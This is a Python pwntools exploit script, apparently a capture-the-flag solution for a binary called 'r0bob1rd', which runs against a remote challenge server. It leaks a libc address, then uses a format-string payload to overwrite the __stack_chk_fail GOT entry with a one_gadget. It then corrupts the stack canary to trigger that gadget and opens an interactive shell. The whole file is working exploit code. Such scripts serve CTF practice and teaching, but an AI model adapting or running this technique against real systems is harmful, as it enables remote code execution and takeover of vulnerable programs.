#!/usr/bin/env python3

from pwn import *

exe = ELF("r0bob1rd_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld.so.2")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("83.136.249.34", 35171)

    return r


def main():
    r = conn()

    libc.sym["one_gadget"] = 0xe3b01    # rdx == NULL && r15 == NULL

    r.sendlineafter(b"R0bob1rd > ", b"12")
    r.recvuntil(b"You've chosen: ")
    libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - libc.sym._IO_2_1_stdout_
    log.info(f"libc: 0x{libc.address:x}")

    payload =  fmtstr_payload(8, {exe.got.__stack_chk_fail: libc.sym["one_gadget"]}, write_size = 'short')
    payload += b"A" * (106 - len(payload))      # overwrite canary and trigger __stack_chk_fail --> one_gadget
    r.sendlineafter(b"little description\n", payload)

    r.clean(3)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
